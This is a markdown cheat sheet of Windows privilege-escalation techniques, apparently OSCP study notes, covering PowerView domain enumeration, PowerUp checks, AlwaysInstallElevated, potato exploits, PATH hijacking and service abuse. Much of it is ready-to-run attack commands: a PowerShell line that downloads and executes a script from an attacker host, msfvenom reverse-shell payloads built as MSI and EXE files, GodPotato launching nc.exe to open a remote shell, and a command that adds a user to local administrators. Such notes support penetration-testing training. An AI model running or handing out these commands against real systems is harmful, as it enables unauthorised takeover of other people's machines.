# Windows PrivEsc 
<img width="1024" height="1024" alt="Husky hacker windows privesc" src="https://github.com/user-attachments/assets/84c43e2d-eaec-4f5d-a05d-9b0266e9ffe1" />

## Both AD and Windows PrivEsc go together 

## Manual look up

```
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
Get-ScheduledTask --> check to see if you can abuse a schedule task
```
### Other quick check
```
whoami /priv
wmic service get name,displayname,pathname,startmode
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
echo %PATH%
```

## PowerView Commands
```
. C:\AD\Tools\PowerView.ps1
Get-DomainUser
Get-DomainOU
Get-DomainOU | select -ExpandProperty name
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
Get-DomainGPO
(Get-DomainOU -Identity DevOps).gplink

Get-DomainGPO -Identity '{}' -- use sid with gplink

Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)

Get-ForestDomain -Verbose
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
Get-DomainTrust
Get-DomainTrust
Get-DomainUser | select -ExpandProperty samaccountname
Get-DomainComputer | select -ExpandProperty dnshostname
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain *.local
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}*

 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 

```
## PrivCheck
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## PowerUp commands
One way to share it, in PowerShell:
```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
```
```
powershell -ep bypass
```
Or:
```
powershell -ExecutionPolicy Bypass
```
Then run:
```
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
Then put your focus here:
```
Service Misconfigurations
AlwaysInstallElevated
Modifiable Services
Modifiable Service Binaries
Unquoted Service Paths
Credential Files
Writable Registry Keys
```


## Always Elevated

If powerup shows up:

```
AlwaysInstallElevated: Enabled
```
Check them to make sure
```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
If both show up as this:
```
AlwaysInstallElevated REG_DWORD 0x1
```

Then we can make a msi exploit for it:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi
```
Then run the msi after sharing it:

```
msiexec /quiet /qn /i shell.msi
```

## Low Hanging Fruit 

If you see Impersonate with whoami /priv, stick with sigma and god potato:
<img width="720" height="352" alt="image" src="https://github.com/user-attachments/assets/db7a42ef-0fb8-4808-8924-c0811265ec4c" />

Share the file, along with nc.exe and then run these for god potato:
```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```
```
.\GodPotato-NET4.exe -cmd "C:\Users\user\Desktop\nc.exe <TP> 4444 -e cmd.exe"
```

For Sigma potato:
```
.\sp.exe "net localgroup administrators user /add"
```

## PATH Hijack
PowerUp may show with write permissions to the PATH directory
```
echo %PATH%
Get-ChildItem Env:PATH
icacls "C:\Program Files\App"
accesschk.exe -uwdq "C:\Program Files\App"
```
Like:
```
Backup.exe
```
Check with accesschk.exe/icals 

replace it with your own:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > backup.exe
```
Then, after sharing it, run it, and check the shell.

## Writeable Service/Unqouted Path/Modify Service

```
Get-ModifiableService

```
Or in powerview:
```
Get-ServiceUnquoted
```
```
ModifiableServiceFile

FilePermissions : Everyone [WriteData]
Path            : C:\Program Files\App\service.exe
```

Then make an msfvenom:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
```
```
sc stop VulnService
sc start VulnService
```

## DLL Hijacking
```
wmic service get name,displayname,pathname,startmode
```
```
icacls "C:\Program Files\App"
```

## Winpeas
### Quick Check
```
winPEAS.exe quiet
```
privcheck
```
winPEAS.exe cmd
```
Token/priv
```
winPEAS.exe systeminfo
```

## Links

I go over a lot more tactics here in this blog post:

https://medium.com/@aaronashley466/oscp-notes-windows-privesc-cheatsheet-1c71a792f545?postPublishedType=repub
